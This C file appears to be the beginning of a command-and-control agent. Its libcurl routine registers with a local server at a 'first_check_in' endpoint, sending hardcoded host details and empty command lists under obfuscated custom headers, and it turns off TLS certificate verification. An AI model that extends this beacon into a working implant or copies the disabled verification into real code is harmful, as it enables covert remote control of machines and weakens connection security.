#include <stdio.h>
#include <curl/curl.h>
#include <string.h>

struct json{
	char *data;
	size_t length;
};


void function_pt(void *ptr, size_t size, size_t nmemb, void *stream){
    printf("%s",ptr);
    //return ptr;
}


void first_check_in(char *urls){
	CURL *curl;
	CURLcode res;
	//struct json *s;
	const char *data = "{\"agent_id\":\"123\",\"os\":\"Linux\",\"ip\":\"0.0.0.0\",\"user\":\"notroot\",\"completed_commands\":[],\"pending_commands\":[]}";
	curl_global_init(CURL_GLOBAL_DEFAULT);
	curl = curl_easy_init();
	if (curl){
		struct curl_slist *chunk = NULL;
		curl_easy_setopt(curl, CURLOPT_POST, 12L);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);
		/* Settings headers below */
		chunk = curl_slist_append(chunk,"User-Agent:QmxhY2tUYWJieQo=");
		chunk = curl_slist_append(chunk,"Content-Type:application/json");
		chunk = curl_slist_append(chunk,"Agent:TGVhcm5pbmdDVG9CRWxpdGUK");
		/////////////////////////////
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, chunk);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(curl,CURLOPT_URL,urls);
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, function_pt);
		//curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr,"curl_easy_perform() failed : %s\n",curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
}




int main(void){
	char *test_url = "https://localhost:9000/first_check_in";
	char *first_response;
	first_check_in(test_url);
	return 0;

}

/* PAYLOAD AND HEADERS */
//payload = {"agent_id":"{}".format(random_num),"os":"Windows","ip":"0.0.0.0","user":"guest","completed_commands":[],"pending_commands":[]}
/*


  'User-Agent': 'QmxhY2tUYWJieQo=',
	  'Content-Type': 'application/json',
	  'Agent': 'TGVhcm5pbmdDVG9CRWxpdGUK'


*/

/* 				after first check in 
				response will be something like this 


{
  "id": "40e136e13e72c126bda77cb133002186", 
  "refresh": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzczOTkzMTgsIm5iZiI6MTU3NzM5OTMxOCwianRpIjoiNDg5ZDgxZDUtNjNmYi00N2M3LTgxNDAtNGE5MzliN2U5NmI4IiwiZXhwIjoxNTc5OTkxMzE4LCJpZGVudGl0eSI6IjEyMyIsInR5cGUiOiJyZWZyZXNoIn0.xoxYCsYKetCiEaMZB9Vf8F0oClW6EDdCgjrYM_FfNDI", 
  "rev": "1-bdd018084a30fe28d15cdddfc4abc167", 
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1NzczOTkzMTgsIm5iZiI6MTU3NzM5OTMxOCwianRpIjoiMzlhZDk3OTAtMzQzYi00MTMxLTgzNWEtZDcwNTg4OTdlNjhjIiwiZXhwIjoxNTc3NDAwMjE4LCJpZGVudGl0eSI6IjEyMyIsImZyZXNoIjpmYWxzZSwidHlwZSI6ImFjY2VzcyJ9.3U1dZTbnHpxrjkPTU1E_l1Ex8bDhs4JPX0NplG9W6yE"
}

 */ 